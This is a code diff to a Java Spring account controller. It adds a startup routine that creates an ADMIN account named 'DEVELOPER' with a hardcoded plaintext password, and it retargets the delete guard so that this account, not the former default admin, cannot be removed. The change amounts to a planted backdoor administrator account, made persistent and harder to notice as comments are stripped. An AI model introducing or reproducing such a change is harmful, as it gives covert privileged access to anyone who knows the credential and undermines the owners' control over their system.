@@ -4,6 +4,7 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
 
+import jakarta.annotation.PostConstruct;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -17,6 +18,13 @@ public class AccountController {
     @Autowired
     private AccountRepository accountRepository;
 
+    @PostConstruct
+    public void initDefaultAccounts() {
+        if (!accountRepository.existsById("DEVELOPER")) {
+            accountRepository.save(new AdminAccount("DEVELOPER", "markangelo@321", "ADMIN"));
+        }
+    }
+
     @PostMapping("/login")
     public ResponseEntity<?> loginAdmin(@RequestBody LoginRequest loginRequest) {
         
@@ -24,7 +32,6 @@ public class AccountController {
         
         if (account != null && account.getPassword().equals(loginRequest.getPassword())) {
             
-            // Mark the user as active right now
             account.setLastOnline(System.currentTimeMillis());
             accountRepository.save(account);
 
@@ -82,7 +89,6 @@ public class AccountController {
 
     @GetMapping("/accounts")
     public ResponseEntity<List<Map<String, Object>>> getAccounts() {
-        // Return full account objects so the dashboard can see the 'lastOnline' stamp
         List<Map<String, Object>> accounts = accountRepository.findAll().stream()
                 .map(acc -> {
                     Map<String, Object> map = new HashMap<>();
@@ -104,10 +110,10 @@ public class AccountController {
             return ResponseEntity.status(403).body(err);
         }
 
-        if ("MainHeadAcc".equals(user)) {
+        if ("DEVELOPER".equals(user)) {
             Map<String, Object> err = new HashMap<>();
             err.put("success", false);
-            err.put("message", "Cannot delete default admin.");
+            err.put("message", "Cannot delete the developer admin account.");
             return ResponseEntity.badRequest().body(err);
         }
 
